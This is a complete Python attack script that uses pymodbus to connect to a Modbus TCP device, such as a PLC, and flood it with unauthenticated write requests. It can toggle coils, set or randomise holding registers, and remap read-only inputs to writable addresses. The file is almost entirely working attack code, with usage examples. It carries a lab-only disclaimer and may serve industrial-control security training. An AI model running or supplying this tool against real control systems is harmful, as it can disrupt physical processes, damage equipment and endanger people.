#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
modbus-1-attack.py
Modbus write-only attack demo (pymodbus 3.5.2)

SYNOPSIS
  Send repeated Modbus write requests to a target like coil[1], hr[5], di[2], ir[3].
  The script maps read-only HMI labels into writable Modbus primitives for demo purposes:
    - di[*] -> coil[*]  (discrete inputs are read-only; mapped to coil)
    - ir[*], input[*] -> hr[*]  (input regs mapped to holding regs)

IMPORTANT: Only use in a lab / simulated environment you control.
"""

from __future__ import annotations

import argparse
import textwrap
import re
import sys
import time
import random
from typing import Tuple, Any

# Use the documented client import for pymodbus 3.5.2
from pymodbus.client import ModbusTcpClient

# Regex for targets like coil[1], hr[5], di[2], ir[3]
TARGET_RE = re.compile(r"^(?P<kind>[a-zA-Z_]+)\[(?P<index>\d+)\]$")

def parse_target(s: str) -> Tuple[str, int]:
    m = TARGET_RE.match(s.strip())
    if not m:
        raise ValueError(f"Invalid target format: '{s}'. Expected like coil[1] or hr[5].")
    kind_raw = m.group("kind").lower()
    idx = int(m.group("index"))
    # Normalize/mapping to writable primitives
    if kind_raw in ("coil", "coils"):
        kind = "coil"
    elif kind_raw in ("hr", "holding", "holding_register", "holding_registers"):
        kind = "hr"
    elif kind_raw in ("di", "discrete", "discrete_input", "discrete_inputs"):
        # Discrete inputs are read-only in Modbus; map to coil for demo writes.
        kind = "coil"
    elif kind_raw in ("ir", "input", "if", "in", "it", "input_register", "input_registers"):
        # Input registers normally read-only; map to holding registers for demo writes.
        kind = "hr"
    else:
        raise ValueError(f"Unknown target kind '{kind_raw}' in '{s}'")
    return kind, idx

def write_one(client: ModbusTcpClient, kind: str, addr: int, value: Any, unit: int):
    """
    Perform a single write operation. Returns (ok: bool, result_or_exc).
    """
    try:
        if kind == "coil":
            # Accept booleans or ints/strings for coils.
            if isinstance(value, str):
                v = value.lower()
                if v in ("1", "true", "on", "yes"):
                    val = True
                elif v in ("0", "false", "off", "no"):
                    val = False
                else:
                    # fallback numeric-like
                    try:
                        val = bool(int(value))
                    except Exception:
                        val = True
            else:
                # numeric or bool
                val = bool(int(value))
            resp = client.write_coil(addr, val, unit=unit)
        elif kind == "hr":
            # Write single 16-bit register
            resp = client.write_register(addr, int(value), unit=unit)
        else:
            return False, RuntimeError("Unsupported kind")
        # pymodbus responses provide isError()
        if hasattr(resp, "isError") and resp.isError():
            return False, resp
        return True, resp
    except Exception as exc:
        return False, exc

def build_arg_parser() -> argparse.ArgumentParser:
    epilog = textwrap.dedent("""\
    EXAMPLES:
      # Toggle coil 1 on remote PLC 50 times every 200ms
      python3 modbus-1-attack.py --host 192.0.2.10 --target coil[1] --num 50 --wait 200 --toggle

      # Write value 1500 into holding register 5 five times, 500ms apart
      python3 modbus-1-attack.py --host 192.0.2.10 --target hr[5] --value 1500 --num 5 --wait 500

      # Simulate an HMI user trying to set discrete input di[2] (script maps DI->coil for demo)
      python3 modbus-1-attack.py --target di[2] --num 20 --wait 100

    NOTES:
      - Mapping performed for demo friendliness:
          di[*] -> coil[*]
          ir[*], input[*] -> hr[*]
      - Address numbers are treated as zero-based indexes (coil[0] => address 0).
      - Only WRITE requests are performed (no reads).
      - Use only against lab/simulated PLCs you control.
    """)
    parser = argparse.ArgumentParser(
        prog="modbus-1-attack.py",
        description="Modbus write-only attack demo (pymodbus 3.5.2). Send repeated write requests.",
        epilog=epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--host", "-H", default="127.0.0.1", help="Target Modbus TCP host (default: 127.0.0.1)")
    parser.add_argument("--port", "-P", default=502, type=int, help="Target Modbus TCP port (default: 502)")
    parser.add_argument("--unit", "-u", default=1, type=int, help="Modbus Unit ID (default: 1)")
    parser.add_argument("--target", "-t", required=True, help="Target like coil[1], hr[5], di[2], ir[3].")
    parser.add_argument("--num", "-n", default=1, type=int, help="Number of write requests to send (default: 1)")
    parser.add_argument("--wait", "-w", default=0, type=int, help="Milliseconds to wait between requests (default: 0)")
    parser.add_argument("--value", "-v", default=None, help="Value to write (coils: 1/0 or true/false; regs: integer).")
    parser.add_argument("--toggle", action="store_true", help="(coils only) toggle between True/False each request.")
    parser.add_argument("--random", action="store_true", help="Randomize register values on each write (registers only).")
    parser.add_argument("--verbose", "-V", action="store_true", help="Verbose output (prints response objects).")
    parser.add_argument("--version", action="version", version="modbus-1-attack 1.0")
    return parser

def main() -> None:
    parser = build_arg_parser()
    args = parser.parse_args()

    try:
        kind, addr = parse_target(args.target)
    except ValueError as exc:
        print("ERROR:", exc, file=sys.stderr)
        sys.exit(2)

    # Determine initial write value
    if args.value is None:
        write_value = 1 if kind == "coil" else 100
    else:
        write_value = args.value

    client = ModbusTcpClient(host=args.host, port=args.port, timeout=3)
    connected = client.connect()
    if not connected:
        print(f"ERROR: cannot connect to {args.host}:{args.port}", file=sys.stderr)
        sys.exit(3)

    print(f"Connected to {args.host}:{args.port} unit={args.unit}")
    print(f"Target -> kind={kind}, address={addr}")
    print(f"Requests -> num={args.num}, wait={args.wait}ms, value={write_value}, toggle={args.toggle}, random={args.random}")

    success_count = 0
    last_val = None
    try:
        for i in range(args.num):
            # Compute the value for this iteration
            if kind == "coil" and args.toggle:
                # Toggle behavior for coils
                if i == 0:
                    if args.value is None:
                        val = True
                    else:
                        try:
                            val = bool(int(args.value))
                        except Exception:
                            val = str(args.value).lower() in ("1", "true", "on", "yes")
                else:
                    val = not last_val
                last_val = val
            else:
                if args.random and kind == "hr":
                    val = random.randint(0, 32767)
                else:
                    # Use provided value (string/int)
                    if isinstance(write_value, str) and kind == "hr":
                        try:
                            val = int(write_value)
                        except Exception:
                            val = 100
                    else:
                        val = write_value

            ok, resp = write_one(client, kind, addr, val, args.unit)
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            if ok:
                success_count += 1
                if args.verbose:
                    print(f"[{ts}] #{i+1}/{args.num} WRITE OK -> {args.target} <= {val!r}  resp={resp}")
                else:
                    print(f"[{ts}] #{i+1}/{args.num} WRITE OK -> {args.target} <= {val!r}")
            else:
                print(f"[{ts}] #{i+1}/{args.num} WRITE FAIL -> {args.target} <= {val!r}  ({resp})", file=sys.stderr)

            # wait between requests if requested
            if i != args.num - 1 and args.wait > 0:
                time.sleep(args.wait / 1000.0)
    finally:
        client.close()

    print(f"Done. successes: {success_count}/{args.num}")

if __name__ == "__main__":
    main()

